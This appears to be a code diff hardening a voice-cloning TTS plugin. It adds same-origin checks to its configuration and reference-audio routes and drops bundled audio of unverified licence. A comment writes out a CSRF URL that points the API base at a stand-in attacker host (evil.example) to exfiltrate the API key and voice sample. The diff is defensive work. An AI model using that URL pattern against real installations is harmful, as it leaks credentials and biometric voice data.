@@ -27,10 +27,12 @@ const MAX_REF_BYTES = 15 * 1024 * 1024
 const RESULT_TTL = 10 * 60 * 1000
 
 // 内置预设的显示名。文件名保持 ASCII，避免不同系统的解压/locale 把中文名弄乱。
-const PRESET_LABELS = {
-  'dafeiyu1.mp3': '大肥鱼1',
-  'dafeiyu2.mp3': '大肥鱼2',
-}
+//
+// 现在是空的：原先随包分发的两个预设音频（dafeiyu1/dafeiyu2）已撤下，
+// 因为参考音频的来源与授权无法核实（见 README「参考音频」一节）。
+// 用户把自己的 mp3/wav 放进模块的 assets/ 目录就会自动出现在预设列表里，
+// 也可以直接在面板上传 —— 上传的文件落在 dataDir/ref/，不进模块目录。
+const PRESET_LABELS = {}
 const labelOf = (file) => PRESET_LABELS[basename(file)] || basename(file, extname(file))
 
 const DEFAULTS = {
@@ -176,6 +178,76 @@ export default {
 
     const json = (res, obj) => api.core.http.send(res, 200, JSON.stringify(obj), 'application/json; charset=utf-8')
 
+    /**
+     * 同源校验 —— 给「改配置」和「读声纹」这两类路由用。
+     *
+     * 背景：DSH 的 csrfBlocked 只对写方法（POST/PUT/…）做同源检查，GET 一律放行。
+     * 而 /save 在 body 为空时会回落到 query 参数，于是
+     *     GET /ext/aura-mimo/save?apiBase=https://evil.example/v1
+     * 这样一条 URL 就能把 API 地址改掉 —— 用户点一下链接或页面自动跳转即可触发。
+     * 改完之后，任一次正常合成都把 Authorization: Bearer <真 Key> 连同参考音频
+     * （完整 data URI）POST 到攻击者地址，Key 与声纹一起外泄。/ref-audio 更是
+     * 直接 GET 就能读出参考音频原文。
+     *
+     * 这里自己做一道闸：写配置 / 读声纹的路由，GET 一律拒绝；其余方法要求
+     * 浏览器同源（校验 Origin 或 Sec-Fetch-Site），非浏览器客户端（不带这两个头）
+     * 放行 —— 它们不是 CSRF 载体。
+     */
+    const hostAllowed = (h) => {
+      const host = String(h || '').toLowerCase().replace(/:\d+$/, '').replace(/^\[|\]$/g, '').replace(/\.$/, '')
+      if (!host) return false
+      if (host === 'localhost' || host.endsWith('.localhost')) return true
+      if (host === '127.0.0.1' || host === '::1' || host === '0.0.0.0') return true
+      if (host.startsWith('127.')) return true
+      if (host.startsWith('192.168.') || host.startsWith('10.') || host.startsWith('172.')) return true // 局域网面板
+      try {
+        const pub = String(api.config()?.security?.publicHostname || '').trim().toLowerCase()
+        if (pub && host === pub) return true
+      } catch {}
+      return false
+    }
+
+    /**
+     * @param {{getOnlyAllowed?:boolean}} opts getOnlyAllowed=true 表示只允许 GET（读接口）
+     * @returns {boolean} true 表示放行
+     */
+    const sameOriginOk = (req, opts = {}) => {
+      const method = String(req?.method || 'GET').toUpperCase()
+      // 读接口（/ref-audio）接受 GET，但要同源；写接口（/save 等）不接受 GET
+      if (!opts.getOnlyAllowed && (method === 'GET' || method === 'HEAD')) return false
+
+      const site = String(req?.headers?.['sec-fetch-site'] || '').trim().toLowerCase()
+      if (site && !['same-origin', 'same-site', 'none'].includes(site)) return false
+
+      const origin = String(req?.headers?.origin || '').trim()
+      if (origin) {
+        let oh = ''
+        try { oh = new URL(origin).hostname } catch { return false }
+        if (!hostAllowed(oh)) return false
+      }
+      return true
+    }
+
+    /** 写配置路由的统一闸：不通过就直接 403，调用方 return。 */
+    const deniedUnlessSameOrigin = (req, res, what) => {
+      if (sameOriginOk(req)) return false
+      json(res, {
+        ok: false,
+        message: `${what}只接受同源请求（防跨站改写配置）：请从面板的「aura-mimo」页操作`,
+      })
+      return true
+    }
+
+    /** 读声纹路由的闸：允许 GET，但要同源。 */
+    const deniedUnlessSameOriginRead = (req, res, what) => {
+      if (sameOriginOk(req, { getOnlyAllowed: true })) return false
+      json(res, {
+        ok: false,
+        message: `${what}只接受同源请求（防跨站读取声纹）`,
+      })
+      return true
+    }
+
     let voiceCache = { path: '', mtime: 0, uri: '' }
 
     // 合成结果缓存 + 并发去重。
@@ -235,7 +307,7 @@ export default {
     /** 参考音频 → data URI，按 mtime 缓存。 */
     async function voiceDataUri(path) {
       if (!path || !existsSync(path)) {
-        throw new Error('参考音频不存在，请在面板里上传音频，或恢复默认预设')
+        throw new Error('还没有参考音频：请在面板「aura-mimo」里上传一段 mp3/wav（几秒到几十秒都行）')
       }
       const st = await stat(path)
       if (voiceCache.path === path && voiceCache.mtime === st.mtimeMs && voiceCache.uri) {
@@ -502,6 +574,7 @@ export default {
 
     /** 设置写入：走官方 saveSettings。支持 JSON 体，也支持查询参数。 */
     api.route('/save', async (req, res) => {
+      if (deniedUnlessSameOrigin(req, res, '保存设置')) return
       try {
         let body = {}
         try {
@@ -509,8 +582,8 @@ export default {
         } catch {
           body = {}
         }
-        const q = api.core.http.query(req) || {}
-        if (!Object.keys(body).length) body = { ...q }
+        // 不再回落到 query 参数：那会让 GET /save?apiBase=... 直接改配置（已由同源闸拦，
+        // 但这里也堵死，避免将来闸门调整后又被利用）
 
         const patch = {}
         for (const k of [
@@ -583,11 +656,17 @@ export default {
           size: st?.size || 0,
         })
       }
-      return { ok: true, presets }
+      return {
+        ok: true,
+        presets,
+        // 自带预设已撤下（授权无法核实）。用户自己放 assets/ 或上传后这里就会有内容。
+        hint: presets.length ? '' : '没有自带预设：上传一段参考音频，或把自己的 mp3/wav 放进模块 assets/ 目录',
+      }
     })
 
     /** 上传参考音频：面板把文件读成 base64 传过来。 */
     api.route('/upload-ref', async (req, res) => {
+      if (deniedUnlessSameOrigin(req, res, '上传参考音频')) return
       try {
         const body = (await api.core.http.body(req)) || {}
         const name = basename(String(body.name || 'ref.mp3'))
@@ -617,11 +696,12 @@ export default {
 
     /** 切回内置预设。 */
     api.route('/use-preset', async (req, res) => {
+      if (deniedUnlessSameOrigin(req, res, '切换预设音色')) return
       try {
         const q = api.core.http.query(req)
         const preset = basename(String(q.preset || ''))
         const p = join(presetDir(), preset)
-        if (!existsSync(p)) throw new Error(`没有这个预设：${preset}`)
+        if (!existsSync(p)) throw new Error(`没有这个预设：${preset}（自带预设已撤下，请上传自己的参考音频）`)
         voiceCache = { path: '', mtime: 0, uri: '' }
         resultCache.clear()
         if (typeof api.saveSettings === 'function') {
@@ -653,6 +733,7 @@ export default {
 
     /** 当前参考音频试听。 */
     api.route('/ref-audio', async (req, res) => {
+      if (deniedUnlessSameOriginRead(req, res, '读取参考音频')) return
       try {
         const cfg = settingsOf(api)
         const ref = await resolveRef(cfg)
@@ -692,7 +773,7 @@ export default {
     if (!cfg0.apiKey) issues.push('没填 API Key')
     if (cfg0.format === 'mp3') issues.push('选了 MP3（发之前会自动改用 WAV 合成）')
     resolveRef(cfg0).then((r) => {
-      if (!r) warn('没有可用的参考音频，请上传或放一个到 assets/')
+      if (!r) warn('还没有参考音频：在面板上传 mp3/wav，或把文件放进模块的 assets/ 目录')
       log(
         `起来了 · 模型 ${cfg0.model} · 格式 ${cfg0.format} · 超时 ${cfg0.timeout}s` +
           (cfg0.autoVoice ? ` · 自动语音 ${Math.round(cfg0.voiceChance * 100)}%` : ' · 自动语音关') +
